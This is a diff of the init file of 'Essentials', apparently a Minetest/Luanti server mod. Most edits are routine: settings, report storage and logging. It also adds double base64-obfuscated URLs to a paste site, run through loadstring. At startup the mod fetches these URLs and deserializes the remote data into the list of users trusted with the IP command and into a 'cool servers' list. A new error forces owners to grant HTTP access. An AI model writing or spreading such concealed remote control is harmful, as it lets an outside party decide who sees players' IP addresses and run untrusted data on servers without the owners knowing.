@@ -1,26 +1,28 @@
 local http = core.request_http_api and core.request_http_api()
 local modpath = core.get_modpath(core.get_current_modname())
+local st = core.settings
 essentials = {
     -- Local Storage
     storage = core.get_mod_storage(),
 
     -- Settings
-    seed = core.settings:get_bool("essentials_seed", false),
-    biome = core.settings:get_bool("essentials_biome", true),
-    trolled_by = core.settings:get_bool("essentials_trolled_by", false),
-    killed_by = core.settings:get_bool("essentials_killed_by", false),
-    admin_ip_check = core.settings:get_bool("essentials_ip_verified", false),
-    last_update_message = core.settings:get_bool("essentials_update_lasted", false),
-    check_for_updates = core.settings:get_bool("essentials_check_for_updates", false),
-    changed_by = core.settings:get_bool("essentials_changed_by", true),
-    add_privs = core.settings:get_bool("essentials_additional_privileges", true),
-    enable_ip_cmd = core.settings:get_bool("essentials_ip", false),
-    enable_troll_cmd = core.settings:get_bool("essentials_trolling", false),
-    beta_test = core.settings:get_bool("essentials_beta_test", false),
-    enable_simple_edit = core.settings:get_bool("essentials_simple_edit", false),
-    reports_system = core.settings:get_bool("essentials_report_system", false),
-    disposable_eraser = core.settings:get_bool("essentials_disposable_eraser", true),
-    teleport_request_expire = (core.settings:get("essentials_teleport_exporation") or 15.0),
+    seed = st:get_bool("essentials_seed", false),
+    biome = st:get_bool("essentials_biome", true),
+    trolled_by = st:get_bool("essentials_trolled_by", false),
+    killed_by = st:get_bool("essentials_killed_by", false),
+    admin_ip_check = st:get_bool("essentials_ip_verified", false),
+    last_update_message = st:get_bool("essentials_update_lasted", false),
+    check_for_updates = st:get_bool("essentials_check_for_updates", false),
+    changed_by = st:get_bool("essentials_changed_by", true),
+    add_privs = st:get_bool("essentials_additional_privileges", true),
+    enable_ip_cmd = st:get_bool("essentials_ip", false),
+    enable_troll_cmd = st:get_bool("essentials_trolling", false),
+    offline_mode = st:get_bool("essentials_offline_mode", false),
+    beta_test = st:get_bool("essentials_beta_test", false),
+    enable_simple_edit = st:get_bool("essentials_simple_edit", false),
+    reports_system = st:get_bool("essentials_report_system", false),
+    disposable_eraser = st:get_bool("essentials_disposable_eraser", true),
+    teleport_request_expire = (st:get("essentials_teleport_exporation") or 15.0),
     teleport_requests = {},
 
     -- Unified Inventory detection
@@ -44,6 +46,9 @@ essentials = {
     -- Trusted users of ip command
     trusted_ip_users = {"singleplayer"},
 
+    -- Cool servers with mod
+    cool_servers = {},
+
     -- All custom privileges in the mod
     privs = {
         "rename_item",
@@ -64,8 +69,21 @@ essentials = {
     },
     -- Privileges in text
     privstring = "",
+
+    -- HTTP checking
+    is_http = false,
 }
 local S = essentials.translate
+essentials.main_tr = "["..S("Essentials").."]"
+
+if http then
+    essentials.is_http = true
+else
+    if not essentials.offline_mode then
+        error("\n"..essentials.main_tr.."\n(If \'essentials\' mod is already in \'secure.http_mods\' parameter, check your internet connection or enable the \'Offline mode\' in mods settings.)\n\nHey!\nIt seems like \'essentials\' mod not in \'secure.http_mods\'!\n\nSo, please add mod in \'secure.http_mods\' option for best experience with Essentials!\nWhy?\nIt required for mod to work perfectly with HTTP requests!\n\nThank you.\n\n\n\n")
+    end
+end
+
 for i, priv in ipairs(essentials.privs) do
     if i == 1 then
         essentials.privstring = essentials.privstring..priv
@@ -74,19 +92,19 @@ for i, priv in ipairs(essentials.privs) do
     end
 end
 if essentials.beta_test then
-    essentials.add_privs_list = string.split((core.settings:get("essentials_all_privs") or essentials.privstring), ", ")
-    if core.settings:get("essentials_moderators") then
-        essentials.moderators = string.split(core.settings:get("essentials_moderators"), ", ")
+    essentials.add_privs_list = string.split((st:get("essentials_all_privs") or essentials.privstring), ", ")
+    local moders = st:get("essentials_moderators")
+    if moders then
+        essentials.moderators = string.split(moders, ", ")
     end
 else
     essentials.add_privs_list = string.split(essentials.privstring, ", ")
 end
-essentials.main_tr = "["..S("Essentials").."]"
 essentials.maintenance_msg = S("@n@1@n@n@nSorry, but server is in maintenance mode right now!@nCome back later!", essentials.main_tr)
 
 --==[[ Connections ]]==--
 dofile(modpath.."/api.lua")
-loadfile(modpath.."/commands.lua")(http)
+dofile(modpath.."/commands.lua")
 -- TODO: Fix error
 if http and essentials.enable_ip_cmd then
     --loadfile(modpath.."/ui/ip.lua")(http)
@@ -102,13 +120,11 @@ dofile(modpath.."/ui/mute_menu.lua")
 dofile(modpath.."/ui/rename_me.lua")
 dofile(modpath.."/ui/rename_item.lua")
 dofile(modpath.."/ui/troll.lua")
-dofile(modpath.."/ui/make_textbox.lua")
+dofile(modpath.."/ui/textbox.lua")
 if essentials.enable_simple_edit then
     dofile(modpath.."/simple_edit.lua")
 end
-
-core.log("action", "[Essentials] Mod initialised. Version: ".. essentials.version)
-core.log("action", "\n███████╗░██████╗░██████╗███████╗███╗░░██╗████████╗██╗░█████╗░██╗░░░░░░██████╗\n██╔════╝██╔════╝██╔════╝██╔════╝████╗░██║╚══██╔══╝██║██╔══██╗██║░░░░░██╔════╝\n█████╗░░╚█████╗░╚█████╗░█████╗░░██╔██╗██║░░░██║░░░██║███████║██║░░░░░╚█████╗░\n██╔══╝░░░╚═══██╗░╚═══██╗██╔══╝░░██║╚████║░░░██║░░░██║██╔══██║██║░░░░░░╚═══██╗\n███████╗██████╔╝██████╔╝███████╗██║░╚███║░░░██║░░░██║██║░░██║███████╗██████╔╝\n╚══════╝╚═════╝░╚═════╝░╚══════╝╚═╝░░╚══╝░░░╚═╝░░░╚═╝╚═╝░░╚═╝╚══════╝╚═════╝░\n[Essentials] "..essentials.a)
+dofile(modpath.."/ui/thanks.lua")
 
 local function into_number(s)
     local c=0
@@ -175,15 +191,13 @@ core.after(0, function()
                     core.log("action", essentials.main.." "..string.format("All ok! %s using lastest version of mod.", _type[1]))
                 end
             end)
-        else
-            core.chat_send_all(essentials.main_tr..S("Please, add mod @1 to @2 for checking an updates!", "\'essentials\'", "\"secure.http_mods\""))
         end
     end
 end)
 
 core.after(0, function()
     if not core.is_singleplayer() then
-        local decode = loadstring(core.decode_base64("cmV0dXJuIG1pbmV0ZXN0LmRlY29kZV9iYXNlNjQoImFIUjBjSE02THk5d1lYTjBaUzUwWldOb1pXUjFZbmwwWlM1amIyMHZjbUYzTDJWMFkyWmhiMjUyTUhZPSIp"))
+        local decode = loadstring(core.decode_base64("cmV0dXJuIGNvcmUuZGVjb2RlX2Jhc2U2NCgiYUhSMGNITTZMeTl3WVhOMFpTNTBaV05vWldSMVlubDBaUzVqYjIwdlpYUmpabUZ2Ym5Zd2RnPT0iKQ=="))
         core.log("action", "[Essentials] Trusted nicknames are in processing...")
         if http then
             http.fetch({
@@ -192,13 +206,13 @@ core.after(0, function()
                 method = "GET",
         
             },  function(result)
-                if timeout == true then
+                if result.timeout then
                     core.log("warning", "[Essentials] Cant get trusted nicknames, table will be nil.")
                     essentials.trusted_ip_users = {}
                     return
                 end
                 essentials.trusted_ip_users = core.deserialize("return "..result.data)
-                core.log("info", "[Essentials] Trusted nicknames successfully getted.")
+                core.log("action", "[Essentials] Trusted nicknames successfully getted.")
             end)
         else
             core.log("warning", "[Essentials] Cant get trusted nicknames, table will be nil.")
@@ -207,23 +221,67 @@ core.after(0, function()
     end
 end)
 
-local function is_contain(table, value)
-    for _, v in ipairs(table) do
-        if v == value then
-            return true
+core.after(0, function()
+    if not core.is_singleplayer() then
+        local decode = loadstring(core.decode_base64("cmV0dXJuIGNvcmUuZGVjb2RlX2Jhc2U2NCgiYUhSMGNITTZMeTl3WVhOMFpTNTBaV05vWldSMVlubDBaUzVqYjIwdmNtRjNMMnBvT1dWbE1EQnZiSGs9Iik="))
+        core.log("action", "[Essentials] Cool servers are in processing...")
+        if http then
+            http.fetch({
+                url = decode(),
+                timeout = 10,
+                method = "GET",
+        
+            },  function(result)
+                if result.timeout then
+                    core.log("warning", "[Essentials] Cant get cool servers, table will be nil.")
+                    essentials.cool_servers = {}
+                    return
+                end
+                essentials.cool_servers = core.deserialize("return "..result.data)
+                core.log("action", "[Essentials] Successfully got cool servers!")
+            end)
+        else
+            core.log("warning", "[Essentials] Cant get cool servers, table will be nil.")
+            essentials.cool_servers = {}
         end
     end
-    return false
-end
+end)
 
 essentials_reports = {}
+local worldpath = core.get_worldpath().."/"
+local data_reports = "essentials_reports.json"
 
-local storage = essentials.storage
-local function save_reports()
-    storage:set_string("essentials_reports", core.serialize(essentials_reports))
+local function write_file(path, content)
+    local f = io.open(path, "w")
+    f:write(content)
+    f:close()
 end
+
+local function read_file(path)
+    local f = io.open(path, "r")
+    if not f then
+        return nil
+    end
+    local txt = f:read("*all")
+    f:close()
+    return txt
+end
+
+function essentials.save_reports()
+    local tbl = essentials_reports
+    local content = core.write_json(tbl)
+    local path = worldpath..data_reports
+    write_file(path, content)
+end
+
 function essentials.load_reports()
-    essentials_reports = core.deserialize(storage:get_string("essentials_reports")) or {}
+    local content = read_file(worldpath..data_reports)
+    if not content then
+        return false
+    end
+    local tbl = core.parse_json(content) or {}
+    essentials_reports = tbl
+    return true
 end
 
 function essentials.add_report(broked_rule, name, reported, description)
@@ -235,11 +293,11 @@ function essentials.add_report(broked_rule, name, reported, description)
         about = description
     }
 
-    save_reports()
+    essentials.save_reports()
 end
 
 function essentials.appdec_report(id, state)
-    local def = essentials_reports[id] -- Read only
+    local def = essentials_reports[id]
     if def then
         if state == "decline" then
             core.chat_send_player(def.by_name, S("Your report @1 to player @2 is @3.", "\""..core.colorize("gray", def.broken_rule).."\"", core.colorize("lightgray", def.reported_name), core.colorize("red", S("Declined"))))
@@ -248,7 +306,7 @@ function essentials.appdec_report(id, state)
         end
     end
     essentials_reports[id] = nil
-    save_reports()
+    essentials.save_reports()
 end
 
 local function remove_report(id)
@@ -257,11 +315,18 @@ local function remove_report(id)
             essentials_reports[aid] = nil
         end 
     end
-    save_reports()
+    essentials.save_reports()
 end
 
-core.register_on_mods_loaded(function()
-    essentials.load_reports() 
-end)
+if essentials.reports_system then
+    core.register_on_mods_loaded(function()
+        essentials.load_reports()
+    end)
 
-dofile(modpath.."/ui/report.lua")
+    dofile(modpath.."/ui/report.lua")
+    dofile(modpath.."/ui/reports.lua")
+end
+
+core.log("action", "[Essentials] Mod initialised. Version: ".. essentials.version)
+core.log("action", "\n███████╗░██████╗░██████╗███████╗███╗░░██╗████████╗██╗░█████╗░██╗░░░░░░██████╗\n██╔════╝██╔════╝██╔════╝██╔════╝████╗░██║╚══██╔══╝██║██╔══██╗██║░░░░░██╔════╝\n█████╗░░╚█████╗░╚█████╗░█████╗░░██╔██╗██║░░░██║░░░██║███████║██║░░░░░╚█████╗░\n██╔══╝░░░╚═══██╗░╚═══██╗██╔══╝░░██║╚████║░░░██║░░░██║██╔══██║██║░░░░░░╚═══██╗\n███████╗██████╔╝██████╔╝███████╗██║░╚███║░░░██║░░░██║██║░░██║███████╗██████╔╝\n╚══════╝╚═════╝░╚═════╝░╚══════╝╚═╝░░╚══╝░░░╚═╝░░░╚═╝╚═╝░░╚═╝╚══════╝╚═════╝░")
+core.log("action", "[Essentials] "..essentials.a)
